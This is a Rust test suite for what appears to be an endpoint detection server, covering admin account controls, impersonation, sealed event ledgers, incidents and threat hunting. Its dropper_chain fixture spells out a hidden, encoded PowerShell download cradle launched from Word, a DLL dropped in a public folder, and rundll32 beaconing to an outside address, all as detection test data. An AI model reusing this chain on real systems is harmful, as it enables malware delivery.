    assert!(actions.contains(&"user.sign_out".to_string()) && actions.contains(&"user.password_reset".to_string()));
}

#[tokio::test]
async fn test_an_admin_changes_their_own_password_only_with_the_current_one() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_user(&pool, "u-self", "owner", ACCOUNT_PASSWORD, "admin").await;
    let session = session_of(&app, "owner").await;
    let uri = "/api/admin/users/u-self/password";

    let (status, _) = call(&app, "POST", uri, Some(&session), Some(serde_json::json!({ "password": "New-Horse-Battery-7" }))).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    let wrong = serde_json::json!({ "password": "New-Horse-Battery-7", "current_password": "Wrong-Horse-9" });
    let (status, _) = call(&app, "POST", uri, Some(&session), Some(wrong)).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    let (status, _) = sign_in(&app, "owner", ACCOUNT_PASSWORD).await;
    assert_eq!(status, StatusCode::OK, "a refused change leaves the password alone");

    let right = serde_json::json!({ "password": "New-Horse-Battery-7", "current_password": ACCOUNT_PASSWORD });
    let (status, _) = call(&app, "POST", uri, Some(&session), Some(right)).await;
    assert_eq!(status, StatusCode::NO_CONTENT);
    let (status, _) = sign_in(&app, "owner", "New-Horse-Battery-7").await;
    assert_eq!(status, StatusCode::OK);
}

#[tokio::test]
async fn test_account_controls_refuse_your_own_account_bad_input_and_the_read_only_role() {
    let app = create_test_app().await;
    let admin = admin_token("admin");

    for change in [serde_json::json!({ "disabled": true }), serde_json::json!({ "role": "user" })] {
        let (status, _) = call(&app, "PATCH", "/api/admin/users/user-1", Some(&admin), Some(change)).await;
        assert_eq!(status, StatusCode::BAD_REQUEST, "an admin cannot demote or disable their own account");
    }
    let (status, _) = call(&app, "POST", "/api/admin/users/user-1/mfa/reset", Some(&admin), None).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    let (status, _) = call(&app, "PATCH", "/api/admin/users/user-2", Some(&admin), Some(serde_json::json!({ "role": "owner" }))).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    let (status, _) = call(&app, "PATCH", "/api/admin/users/missing", Some(&admin), Some(serde_json::json!({ "disabled": true }))).await;
    assert_eq!(status, StatusCode::NOT_FOUND);
    for uri in ["/api/admin/users/missing/sign-out", "/api/admin/users/missing/mfa/reset"] {
        let (status, _) = call(&app, "POST", uri, Some(&admin), None).await;
        assert_eq!(status, StatusCode::NOT_FOUND);
    }

    let reader = admin_token("user");
    let refused = [
        ("PATCH", "/api/admin/users/user-1", Some(serde_json::json!({ "disabled": true }))),
        ("POST", "/api/admin/users/user-1/password", Some(serde_json::json!({ "password": "New-Horse-Battery-7" }))),
        ("POST", "/api/admin/users/user-1/mfa/reset", None),
        ("POST", "/api/admin/users/user-1/sign-out", None),
        ("POST", "/api/admin/users/user-1/impersonate", None),
    ];
    for (method, uri, body) in refused {
        let (status, _) = call(&app, method, uri, Some(&reader), body).await;
        assert_eq!(status, StatusCode::FORBIDDEN, "{} {} must need the admin role", method, uri);
    }
}

#[tokio::test]
async fn test_resetting_a_second_factor_lets_the_account_sign_in_with_its_password() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_user(&pool, "u-lost", "lostphone", ACCOUNT_PASSWORD, "user").await;
    sqlx::query("UPDATE users SET mfa_enabled = 1, mfa_secret = 'JBSWY3DPEHPK3PXP' WHERE id = 'u-lost'").execute(&pool).await.unwrap();
    sqlx::query("INSERT INTO mfa_recovery_codes (user_id, code_hash) VALUES ('u-lost', 'hash')").execute(&pool).await.unwrap();

    let (_, login) = sign_in(&app, "lostphone", ACCOUNT_PASSWORD).await;
    assert_eq!(login["mfa_required"], true);
    assert!(login["token"].is_null());

    let (status, _) = call(&app, "POST", "/api/admin/users/u-lost/mfa/reset", Some(&admin_token("admin")), None).await;
    assert_eq!(status, StatusCode::NO_CONTENT);

    let (_, login) = sign_in(&app, "lostphone", ACCOUNT_PASSWORD).await;
    assert_eq!(login["mfa_required"], false);
    assert!(login["token"].is_string());
    let codes: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM mfa_recovery_codes WHERE user_id = 'u-lost'").fetch_one(&pool).await.unwrap();
    assert_eq!(codes, 0);
    assert!(audit_actions(&pool).await.contains(&"user.mfa_reset".to_string()));
}

async fn impersonate(app: &axum::Router, admin: &str, target: &str) -> (StatusCode, serde_json::Value) {
    call(app, "POST", &format!("/api/admin/users/{}/impersonate", target), Some(admin), None).await
}

#[tokio::test]
async fn test_impersonation_has_the_rights_of_the_other_role_and_records_the_real_admin() {
    let (app, pool) = create_test_app_with_pool().await;
    let admin = admin_token("admin");

    let (status, issued) = impersonate(&app, &admin, "user-2").await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(issued["username"], "reader");
    assert_eq!(issued["role"], "user");
    let token = issued["token"].as_str().unwrap().to_string();
    let lifetime = issued["expires_at"].as_i64().unwrap() - chrono::Utc::now().timestamp();
    assert!((29 * 60..=30 * 60).contains(&lifetime), "impersonation lasts thirty minutes, got {} seconds", lifetime);

    let (status, _) = call(&app, "GET", "/api/admin/agents", Some(&token), None).await;
    assert_eq!(status, StatusCode::OK);
    let beyond_the_role = [
        ("GET", "/api/admin/users", None),
        ("GET", "/api/admin/audit", None),
        ("POST", "/api/admin/installers/generate", Some(serde_json::json!({}))),
        ("POST", "/api/admin/users/user-1/impersonate", None),
        ("POST", "/api/admin/users/user-2/sign-out", None),
    ];
    for (method, uri, body) in beyond_the_role {
        let (status, _) = call(&app, method, uri, Some(&token), body).await;
        assert_eq!(status, StatusCode::FORBIDDEN, "{} {} is beyond the impersonated role", method, uri);
    }

    let (status, key) = call(&app, "POST", "/api/admin/api-keys", Some(&token), Some(serde_json::json!({ "name": "made while impersonating" }))).await;
    assert!(status.is_success(), "what the role may do, the impersonation may do");
    let owner: String = sqlx::query_scalar("SELECT user_id FROM api_keys WHERE id = ?").bind(key["id"].as_str().unwrap()).fetch_one(&pool).await.unwrap();
    assert_eq!(owner, "user-2");

    let entries: Vec<(String, String, String, String)> =
        sqlx::query_as("SELECT action, actor, actor_id, detail FROM audit_log ORDER BY seq").fetch_all(&pool).await.unwrap();
    let recorded: Vec<(&str, &str, &str)> = entries.iter().map(|entry| (entry.0.as_str(), entry.1.as_str(), entry.2.as_str())).collect();
    assert_eq!(recorded, vec![("user.impersonate", "tester", "user-1"), ("api_key.create", "tester", "user-1")]);
    assert!(entries[0].3.contains("reader"));
    assert!(entries[1].3.contains("\"as\":\"reader\""), "the entry names the account it was done as: {}", entries[1].3);
}

#[tokio::test]
async fn test_impersonation_is_refused_for_admins_yourself_and_disabled_accounts() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_user(&pool, "u-peer", "peer", ACCOUNT_PASSWORD, "admin").await;
    insert_user(&pool, "u-idle", "idle", ACCOUNT_PASSWORD, "user").await;
    let admin = admin_token("admin");
    call(&app, "PATCH", "/api/admin/users/u-idle", Some(&admin), Some(serde_json::json!({ "disabled": true }))).await;

    for target in ["user-1", "u-peer", "u-idle"] {
        let (status, _) = impersonate(&app, &admin, target).await;
        assert_eq!(status, StatusCode::BAD_REQUEST, "{} cannot be impersonated", target);
    }
    let (status, _) = impersonate(&app, &admin, "missing").await;
    assert_eq!(status, StatusCode::NOT_FOUND);
    let (status, _) = impersonate(&app, &admin_token("user"), "user-2").await;
    assert_eq!(status, StatusCode::FORBIDDEN);

    let recorded: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM audit_log WHERE action = 'user.impersonate'").fetch_one(&pool).await.unwrap();
    assert_eq!(recorded, 0, "a refused impersonation is not recorded as one");
}

#[tokio::test]
async fn test_impersonation_ends_with_either_account() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_user(&pool, "u-boss", "boss", ACCOUNT_PASSWORD, "admin").await;
    let boss = session_of(&app, "boss").await;
    let admin = admin_token("admin");
    let open = |token: String| {
        let app = app.clone();
        async move { call(&app, "GET", "/api/admin/agents", Some(&token), None).await.0 }
    };
    let start = || async { impersonate(&app, &boss, "user-2").await.1["token"].as_str().unwrap().to_string() };

    let token = start().await;
    assert_eq!(open(token.clone()).await, StatusCode::OK);
    call(&app, "POST", "/api/admin/users/user-2/sign-out", Some(&admin), None).await;
    assert_eq!(open(token).await, StatusCode::UNAUTHORIZED, "signing the shown account out ends it");

    let token = start().await;
    call(&app, "PATCH", "/api/admin/users/u-boss", Some(&admin), Some(serde_json::json!({ "role": "user" }))).await;
    assert_eq!(open(token.clone()).await, StatusCode::UNAUTHORIZED, "it ends when the impersonator stops being an admin");
    call(&app, "PATCH", "/api/admin/users/u-boss", Some(&admin), Some(serde_json::json!({ "role": "admin" }))).await;
    assert_eq!(open(token.clone()).await, StatusCode::OK);

    call(&app, "POST", "/api/admin/users/u-boss/sign-out", Some(&admin), None).await;
    assert_eq!(open(token).await, StatusCode::UNAUTHORIZED, "signing the impersonator out ends it");

    let boss = session_of(&app, "boss").await;
    let token = impersonate(&app, &boss, "user-2").await.1["token"].as_str().unwrap().to_string();
    call(&app, "DELETE", "/api/admin/users/u-boss", Some(&admin), None).await;
    assert_eq!(open(token).await, StatusCode::UNAUTHORIZED, "deleting the impersonator ends it");
}

#[tokio::test]
async fn test_the_last_sign_in_is_recorded() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_user(&pool, "u-seen", "regular", ACCOUNT_PASSWORD, "user").await;
    let admin = admin_token("admin");
    let last_sign_in = |users: &serde_json::Value| {
        users.as_array().unwrap().iter().find(|user| user["id"] == "u-seen").unwrap()["last_login_at"].clone()
    };

    let (_, users) = call(&app, "GET", "/api/admin/users", Some(&admin), None).await;
    assert!(last_sign_in(&users).is_null());

    sign_in(&app, "regular", "Wrong-Horse-9").await;
    let (_, users) = call(&app, "GET", "/api/admin/users", Some(&admin), None).await;
    assert!(last_sign_in(&users).is_null(), "a failed sign-in is not a sign-in");

    session_of(&app, "regular").await;
    let (_, users) = call(&app, "GET", "/api/admin/users", Some(&admin), None).await;
    assert!(last_sign_in(&users).is_i64());
}

fn started(timestamp: u64, pid: u32, ppid: u32, path: &str, args: &[&str]) -> SensorEvent {
    let mut command_line = vec![path.to_string()];
    command_line.extend(args.iter().map(|arg| arg.to_string()));
    SensorEvent::Process(ProcessEvent { timestamp, pid, ppid, executable_path: path.to_string(), command_line, action: ProcessAction::Create, uid: 1001, hash: None })
}

fn quiet(pid: u32) -> SensorEvent {
    started(u64::from(pid), pid, 1, "/usr/bin/sleep", &["60"])
}

fn became(timestamp: u64, pid: u32, ppid: u32, path: &str, args: &[&str]) -> SensorEvent {
    let SensorEvent::Process(process) = started(timestamp, pid, ppid, path, args) else { unreachable!() };
    SensorEvent::Process(ProcessEvent { action: ProcessAction::Modify, ..process })
}

fn ended(timestamp: u64, pid: u32) -> SensorEvent {
    SensorEvent::Process(ProcessEvent { timestamp, pid, ppid: 0, executable_path: String::new(), command_line: Vec::new(), action: ProcessAction::Terminate, uid: 0, hash: None })
}

fn connected(timestamp: u64, pid: u32, port: u16) -> SensorEvent {
    SensorEvent::Network(NetworkEvent {
        timestamp,
        pid,
        process_path: String::new(),
        protocol: "tcp".to_string(),
        source_ip: "10.0.0.5".to_string(),
        source_port: 50123,
        dest_ip: "203.0.113.47".to_string(),
        dest_port: port,
        action: NetworkAction::Connect,
        bytes_sent: 1200,
        bytes_received: 184000,
    })
}

fn wrote(timestamp: u64, pid: u32, path: &str) -> SensorEvent {
    SensorEvent::File(FileEvent { timestamp, path: path.to_string(), action: FileAction::Write, pid, process_path: String::new(), hash: None })
}

fn autostart(action: InventoryAction, kind: PersistenceKind, name: &str, path: &str, command: &str, hash: Option<&str>) -> SensorEvent {
    SensorEvent::Persistence(PersistenceEvent {
        timestamp: 1794780000,
        action,
        kind,
        name: name.to_string(),
        path: path.to_string(),
        command: command.to_string(),
        user: "root".to_string(),
        enabled: true,
        hash: hash.map(str::to_string),
    })
}

fn package(action: InventoryAction, manager: PackageManager, name: &str, version: &str, previous_version: Option<&str>) -> SensorEvent {
    SensorEvent::Package(PackageEvent {
        timestamp: 1794780000,
        action,
        manager,
        name: name.to_string(),
        version: version.to_string(),
        architecture: "amd64".to_string(),
        previous_version: previous_version.map(str::to_string),
    })
}

fn dropper_chain() -> Vec<SensorEvent> {
    vec![
        started(100, 2596, 2568, "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", &[]),
        started(200, 2600, 2596, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", &["-nop", "-w", "hidden", "-enc", "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"]),
        connected(203, 2600, 443),
        wrote(205, 2600, "C:\\Users\\Public\\update.dll"),
        started(208, 2604, 2600, "C:\\Windows\\System32\\rundll32.exe", &["C:\\Users\\Public\\update.dll,Start"]),
        connected(212, 2604, 8443),
    ]
}

/// The form the server stores an opened event in
fn stored_form(event: &SensorEvent) -> serde_json::Value {
    let tagged = serde_json::to_value(SystemEvent::from(event.clone())).unwrap();
    tagged.as_object().unwrap().values().next().unwrap().clone()
}

/// The sealing half of an agent: it commits to every event, seals it, runs the rules over it, and keeps what a proof needs
#[derive(Clone)]
struct TestLedger {
    agent: Hash,
    master: Hash,
    epoch: u64,
    next_window: u64,
    next_index: u64,
    head: Hash,
    fresh: bool,
    state: State,
    seeds: BTreeMap<u64, Hash>,
    kept: Vec<(WindowHeader, Vec<Vec<u8>>)>,
    proven: usize,
    proven_state: State,
}

impl TestLedger {
    fn of(agent: &TestAgent) -> Self {
        TestLedger {
            agent: sha2::Sha256::digest(agent.key.verifying_key().to_bytes()).into(),
            master: sha2::Sha256::digest(agent.key.to_bytes()).into(),
            epoch: 1,
            next_window: 0,
            next_index: 0,
            head: GENESIS,
            fresh: true,
            state: State::default(),
            seeds: BTreeMap::new(),
            kept: Vec::new(),
            proven: 0,
            proven_state: State::default(),
        }
    }

    fn restart(&mut self) {
        self.epoch += 1;
        self.fresh = true;
        self.state = State::default();
    }

    fn opening(&self, index: u64) -> Opening {
        Opening { index, seed: hash_to_hex(&self.seeds[&index]) }
    }

    fn seal(&mut self, events: &[SensorEvent]) -> SealedWindow {
        self.seal_marked(events, false)
    }

    fn seal_marked(&mut self, events: &[SensorEvent], gap: bool) -> SealedWindow {
        let mut leaves = Vec::new();
        let mut sealed = Vec::new();
        let mut plain = Vec::new();
        let mut releases = Vec::new();
        for (index, event) in (self.next_index..).zip(events) {
            let bytes = event.to_bytes();
            let seed = seal::seed(&self.master, &self.agent, self.epoch, index, &bytes);
            leaves.push(leaf(&self.agent, self.epoch, index, &seal::blind(&seed), &bytes));
            sealed.push(seal::seal(&seed, &self.agent, self.epoch, index, &bytes).unwrap());
            self.seeds.insert(index, seed);
            for found in self.state.observe(index, event) {
                releases.push(Release {
                    trigger: found.trigger,
                    rule: found.rule.id().to_string(),
                    context: found.context.clone(),
                    pid: found.pid,
                    started_at: found.started_at,
                    openings: found.opened().map(|opened| self.opening(opened)).collect(),
                });
            }
            plain.push(bytes);
        }

        let header = WindowHeader::seal(&self.agent, self.epoch, self.next_window, self.next_index, self.fresh, gap, self.head, &leaves).unwrap();
        self.next_window += 1;
        self.next_index = header.next_index();
        self.head = header.head;
        self.fresh = false;
        self.kept.push((header.clone(), plain));

        SealedWindow {
            agent_id: String::new(),
            session: 0,
            seq: 0,
            header: SealedWindowHeader {
                epoch: header.epoch,
                window: header.window,
                first_index: header.first_index,
                count: header.count,
                fresh: header.fresh,
                gap: header.gap,
                prev_head: hash_to_hex(&header.prev_head),
                root: hash_to_hex(&header.root),
                head: hash_to_hex(&header.head),
            },
            events: leaves.iter().zip(&sealed).map(|(leaf, sealed)| SealedEvent { leaf: hash_to_hex(leaf), sealed: bytes_to_base64(sealed) }).collect(),
            releases,
            proving: true,
        }
    }

    /// The journal of a proof over the next windows that have none, computed the way an endpoint knows what its proof will say
    fn journal(&mut self, windows: usize) -> Journal {
        let run = &self.kept[self.proven..self.proven + windows];
        let (first, last) = (&run[0].0, &run[windows - 1].0);
        let input = Input {
            agent: self.agent,
            epoch: first.epoch,
            fresh: first.fresh,
            head_in: first.prev_head,
            state: if first.fresh { State::default() } else { self.proven_state.clone() },
            salt_in: seal::salt(&self.master, &self.agent, first.window),
            salt_out: seal::salt(&self.master, &self.agent, last.window + 1),
            windows: run
                .iter()
                .map(|(header, events)| WindowInput {
                    window: header.window,
                    first_index: header.first_index,
                    gap: header.gap,
                    events: (header.first_index..)
                        .zip(events)
                        .map(|(index, bytes)| Committed { blind: seal::blind(&seal::seed(&self.master, &self.agent, header.epoch, index, bytes)), event: bytes.clone() })
                        .collect(),
                })
                .collect(),
        };

        let (journal, state) = zedr_rules::proof::run(input).unwrap();
        self.proven += windows;
        self.proven_state = state;
        journal
    }
}

/// An enrolled agent with its ledger
struct Endpoint {
    agent: TestAgent,
    ledger: TestLedger,
}

async fn enroll_endpoint(app: &axum::Router, pool: &SqlitePool, agent_id: &str) -> Endpoint {
    let agent = enroll(app, pool, agent_id).await;
    let ledger = TestLedger::of(&agent);
    Endpoint { agent, ledger }
}

impl Endpoint {
    fn restart(&mut self) {
        self.agent.restart();
        self.ledger.restart();
    }

    fn request(&mut self, mut window: SealedWindow) -> String {
        self.agent.seq += 1;
        window.agent_id = self.agent.id.clone();
        window.session = self.agent.session;
        window.seq = self.agent.seq;
        serde_json::to_string(&window).unwrap()
    }

    async fn send(&mut self, app: &axum::Router, window: SealedWindow) -> (StatusCode, serde_json::Value) {
        let body = self.request(window);
        send_signed(app, &self.agent, "/api/windows", body).await
    }

    async fn deliver(&mut self, app: &axum::Router, events: &[SensorEvent]) -> serde_json::Value {
        let window = self.ledger.seal(events);
        let (status, ack) = self.send(app, window).await;
        assert_eq!(status, StatusCode::OK, "{}", ack);
        ack
    }

    async fn submit(&mut self, app: &axum::Router, receipt: &[u8]) -> (StatusCode, serde_json::Value) {
        self.agent.seq += 1;
        let submission = ProofSubmission { agent_id: self.agent.id.clone(), session: self.agent.session, seq: self.agent.seq, receipt: bytes_to_base64(receipt) };
        send_signed(app, &self.agent, "/api/proofs", serde_json::to_string(&submission).unwrap()).await
    }

    async fn prove(&mut self, app: &axum::Router, journal: &Journal) -> (StatusCode, serde_json::Value) {
        self.submit(app, &journal.to_bytes()).await
    }
}

const TEST_IMAGE_ID: Hash = [0x5a; 32];

/// Stands in for the proof system: the receipt is the journal itself
struct JournalAsReceipt;

impl ReceiptVerifier for JournalAsReceipt {
    fn verify(&self, receipt: &[u8]) -> Result<Verified, String> {
        if receipt.is_empty() {
            return Err("An empty receipt proves nothing".to_string());
        }
        Ok(Verified { image_id: TEST_IMAGE_ID, journal: receipt.to_vec() })
    }

    fn image_ids(&self) -> Vec<Hash> {
        vec![TEST_IMAGE_ID]
    }
}

async fn create_proving_app() -> (axum::Router, SqlitePool) {
    set_test_env();
    let pool = create_test_db().await;
    let options = zedr_control_server::api::RouterOptions { receipt_verifier: Some(Arc::new(JournalAsReceipt)), ..Default::default() };
    (zedr_control_server::api::create_router_with_options(pool.clone(), options), pool)
}

fn server_signed(answer: &serde_json::Value, bytes: &[u8]) -> bool {
    let signature: Vec<u8> = answer["signature"].as_array().unwrap().iter().map(|byte| byte.as_u64().unwrap() as u8).collect();
    test_deployment_key().verify(bytes, &ed25519_dalek::Signature::from_slice(&signature).unwrap()).is_ok()
}

async fn count(pool: &SqlitePool, sql: &str, agent_id: &str) -> i64 {
    sqlx::query_scalar(sql).bind(agent_id).fetch_one(pool).await.unwrap()
}

async fn proof_states(pool: &SqlitePool, agent_id: &str) -> Vec<String> {
    sqlx::query_scalar("SELECT proof FROM sealed_windows WHERE agent_id = ? ORDER BY window").bind(agent_id).fetch_all(pool).await.unwrap()
}

async fn findings(pool: &SqlitePool, agent_id: &str) -> Vec<serde_json::Value> {
    sqlx::query_scalar::<_, String>("SELECT data FROM events WHERE agent_id = ? AND event_type = 'detection' ORDER BY rowid")
        .bind(agent_id)
        .fetch_all(pool)
        .await
        .unwrap()
        .iter()
        .map(|data| serde_json::from_str(data).unwrap())
        .collect()
}

async fn incident_evidence(pool: &SqlitePool, agent_id: &str, incident_type: &str) -> serde_json::Value {
    let evidence: String = sqlx::query_scalar("SELECT evidence FROM incidents WHERE agent_id = ? AND incident_type = ?")
        .bind(agent_id)
        .bind(incident_type)
        .fetch_one(pool)
        .await
        .unwrap();
    serde_json::from_str(&evidence).unwrap()
}

/// Every table and column that holds the text anywhere, read as raw bytes
async fn tables_holding(pool: &SqlitePool, needle: &str) -> Vec<String> {
    let tables: Vec<String> = sqlx::query_scalar("SELECT name FROM sqlite_master WHERE type = 'table'").fetch_all(pool).await.unwrap();
    let mut holding = Vec::new();
    for table in tables {
        let columns: Vec<String> = sqlx::query_scalar("SELECT name FROM pragma_table_info(?)").bind(&table).fetch_all(pool).await.unwrap();
        for column in columns {
            let values: Vec<Vec<u8>> = sqlx::query_scalar(&format!("SELECT CAST(\"{column}\" AS BLOB) FROM \"{table}\" WHERE \"{column}\" IS NOT NULL")).fetch_all(pool).await.unwrap();
            if values.iter().any(|value| value.windows(needle.len()).any(|window| window == needle.as_bytes())) {
                holding.push(format!("{table}.{column}"));
            }
        }
    }
    holding.sort();
    holding
}

async fn detection_incidents(pool: &SqlitePool, agent_id: &str) -> Vec<String> {
    let mut types = open_incidents(pool, agent_id).await;
    types.retain(|incident_type| incident_type.starts_with("detection."));
    types.sort();
    types
}

#[tokio::test]
async fn test_a_dropper_chain_opens_detection_incidents_with_evidence() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut host = enroll_endpoint(&app, &pool, "dropper-host").await;

    host.deliver(&app, &dropper_chain()).await;

    assert_eq!(
        detection_incidents(&pool, "dropper-host").await,
        vec![
            "detection.drops-executable",
            "detection.encoded-command",
            "detection.office-child",
            "detection.proxy-loads-writable",
            "detection.proxy-network",
        ]
    );

    let recorded: Vec<String> = sqlx::query_scalar("SELECT data FROM events WHERE agent_id = 'dropper-host' AND event_type = 'detection' ORDER BY rowid")
        .fetch_all(&pool)
        .await
        .unwrap();
    assert_eq!(recorded.len(), 7, "the two medium findings are recorded as events without an incident");
    assert!(recorded.iter().any(|data| data.contains("\"rule\":\"hidden-window\"") && data.contains("\"level\":\"medium\"")));

    let evidence: String = sqlx::query_scalar("SELECT evidence FROM incidents WHERE agent_id = 'dropper-host' AND incident_type = 'detection.office-child'")
        .fetch_one(&pool)
        .await
        .unwrap();
    let evidence: serde_json::Value = serde_json::from_str(&evidence).unwrap();
    assert_eq!(evidence["technique"], "T1204.002");
    assert_eq!(evidence["parent"], "winword.exe");
    assert_eq!(evidence["pid"], 2600);
    assert!(evidence["command"].as_str().unwrap().contains("-enc"));
    assert_eq!((&evidence["trigger"], &evidence["window"], &evidence["proof"]), (&serde_json::json!(1), &serde_json::json!(0), &serde_json::json!("pending")));

    let reached = findings(&pool, "dropper-host").await.into_iter().find(|finding| finding["rule"] == "proxy-network").unwrap();
    assert_eq!(reached["subject"], "203.0.113.47:8443");
    assert_eq!(reached["parent"], "powershell.exe");
    assert!(reached["image"].as_str().unwrap().ends_with("rundll32.exe"));

    let (_, listed) = call(&app, "GET", "/api/admin/incidents?open=true", Some(&admin_token("user")), None).await;
    assert_eq!(listed.as_array().unwrap().iter().filter(|incident| incident["agent_id"] == "dropper-host").count(), 5);
}

#[tokio::test]
async fn test_ordinary_activity_and_the_same_findings_after_a_restart_open_nothing_new() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut host = enroll_endpoint(&app, &pool, "quiet-host").await;

    let ordinary = [
        started(100, 700, 600, "C:\\BuildAgent\\bin\\buildagent.exe", &[]),
        started(110, 704, 700, "C:\\Windows\\System32\\cmd.exe", &["/c", "npm", "ci"]),
        started(120, 708, 704, "C:\\Program Files\\nodejs\\node.exe", &["install.js"]),
        connected(121, 708, 443),
        started(130, 712, 700, "C:\\Python312\\python.exe", &["worker.py"]),
        connected(131, 712, 5432),
    ];
    host.deliver(&app, &ordinary).await;
    assert!(detection_incidents(&pool, "quiet-host").await.is_empty());
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM events WHERE agent_id = ? AND event_type = 'detection'", "quiet-host").await, 0);
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM events WHERE agent_id = ? AND event_type IN ('process', 'network')", "quiet-host").await, 0, "nothing was opened");

    host.deliver(&app, &dropper_chain()).await;
    sqlx::query("UPDATE incidents SET closed_at = opened_at WHERE agent_id = 'quiet-host'").execute(&pool).await.unwrap();

    host.restart();
    host.deliver(&app, &dropper_chain()).await;
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM events WHERE agent_id = ? AND event_type = 'detection'", "quiet-host").await, 7, "a process list seen again after a restart does not repeat its findings");
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM incidents WHERE agent_id = ?", "quiet-host").await, 5, "and opens no incident a second time, not even one that was closed");
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM releases WHERE agent_id = ?", "quiet-host").await, 14, "both releases are held, each for the proof of its own epoch");
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM releases WHERE agent_id = ? AND finding_event_id IS NOT NULL", "quiet-host").await, 7);
}

#[tokio::test]
async fn test_an_admin_closes_an_incident_and_it_is_audited() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut host = enroll_endpoint(&app, &pool, "triaged-host").await;
    host.deliver(&app, &dropper_chain()).await;
    let id: String = sqlx::query_scalar("SELECT id FROM incidents WHERE agent_id = 'triaged-host' AND incident_type = 'detection.proxy-network'")
        .fetch_one(&pool)
        .await
        .unwrap();
    let uri = format!("/api/admin/incidents/{}/close", id);

    let (status, _) = call(&app, "POST", &uri, Some(&admin_token("user")), None).await;
    assert_eq!(status, StatusCode::FORBIDDEN);

    let (status, closed) = call(&app, "POST", &uri, Some(&admin_token("admin")), None).await;
    assert_eq!(status, StatusCode::OK);
    assert!(closed["closed_at"].is_i64());
    assert!(!detection_incidents(&pool, "triaged-host").await.contains(&"detection.proxy-network".to_string()));

    let (status, _) = call(&app, "POST", &uri, Some(&admin_token("admin")), None).await;
    assert_eq!(status, StatusCode::NOT_FOUND, "an incident closes once");
    let (status, _) = call(&app, "POST", "/api/admin/incidents/missing/close", Some(&admin_token("admin")), None).await;
    assert_eq!(status, StatusCode::NOT_FOUND);

    let entry: (String, String, String) = sqlx::query_as("SELECT actor, target, detail FROM audit_log WHERE action = 'incident.close'").fetch_one(&pool).await.unwrap();
    assert_eq!((entry.0.as_str(), entry.1.as_str()), ("tester", id.as_str()));
    assert!(entry.2.contains("detection.proxy-network"));
    let event: String = sqlx::query_scalar("SELECT data FROM events WHERE event_type = 'incident_closed' AND agent_id = 'triaged-host'").fetch_one(&pool).await.unwrap();
    assert!(event.contains("\"closed_by\":\"tester\""));
}

async fn hunt(app: &axum::Router, token: Option<&str>, query: &str) -> (StatusCode, serde_json::Value) {
    call(app, "POST", "/api/admin/hunt", token, Some(serde_json::json!({ "query": query }))).await
}

async fn hunt_total(app: &axum::Router, query: &str) -> i64 {
    let (status, result) = hunt(app, Some(&admin_token("user")), query).await;
    assert_eq!(status, StatusCode::OK, "{} -> {}", query, result);
    result["total"].as_i64().unwrap()
}

#[tokio::test]
async fn test_hunting_finds_a_process_tree_shape_on_every_endpoint_that_released_it() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut first = enroll_endpoint(&app, &pool, "hunt-a").await;
    let mut second = enroll_endpoint(&app, &pool, "hunt-b").await;
    let mut clean = enroll_endpoint(&app, &pool, "hunt-clean").await;
    first.deliver(&app, &dropper_chain()).await;
    second.deliver(&app, &dropper_chain()).await;
    let ordinary = [
        started(100, 700, 600, "C:\\BuildAgent\\bin\\buildagent.exe", &[]),
        started(110, 704, 700, "C:\\Windows\\System32\\cmd.exe", &["/c", "npm", "ci"]),
    ];
    clean.deliver(&app, &ordinary).await;

    let reader = admin_token("user");
    let shape = r#"process where name = "rundll32.exe" and parent.name = powershell.exe and parent.path ~ "\system32\""#;
    let (status, result) = hunt(&app, Some(&reader), shape).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(result["entity"], "process");
    assert_eq!(result["total"], 2);
    let mut endpoints: Vec<(&str, i64)> = result["endpoints"]
        .as_array()
        .unwrap()
        .iter()
        .map(|endpoint| (endpoint["agent_id"].as_str().unwrap(), endpoint["matches"].as_i64().unwrap()))
        .collect();
    endpoints.sort();
    assert_eq!(endpoints, vec![("hunt-a", 1), ("hunt-b", 1)]);
    let row = &result["rows"][0];
    assert_eq!(row["process"], "2604@208", "a row carries the key of its process, so the console can open it");
    assert_eq!(row["cells"][0], "rundll32.exe");
    assert_eq!(row["cells"][1], "powershell.exe");
    assert!(row["cells"][2].as_str().unwrap().contains("update.dll,Start"));

    assert_eq!(hunt_total(&app, r#"connection where dest.ip = "203.0.113.47" and process.name in (rundll32.exe, powershell.exe)"#).await, 4);
    assert_eq!(hunt_total(&app, "connection where dest.port = 8443 and host = test-host").await, 2);
    assert_eq!(hunt_total(&app, r#"file where path ~ "\users\public" and process.name = powershell.exe"#).await, 2);
    assert_eq!(hunt_total(&app, "detection where level = high").await, 10);
    assert_eq!(hunt_total(&app, "detection where rule = hidden-window or rule = shell-network").await, 4);
    assert_eq!(hunt_total(&app, "process where pid >= 2600 and pid < 2700").await, 4);
    assert_eq!(hunt_total(&app, "process where name = winword.exe and parent.name = explorer.exe").await, 0, "a parent that was only opened as context is known without its own parent");
    let (status, refused) = hunt(&app, Some(&reader), "process where grandparent.name = winword.exe").await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "no release tells the server a grandparent, so there is no such field");
    assert!(refused["error"].as_str().unwrap().starts_with("process has no field grandparent.name"));
    assert_eq!(hunt_total(&app, "process where command ~ npm or name = cmd.exe or name = buildagent.exe").await, 0, "what no rule released cannot be hunted");
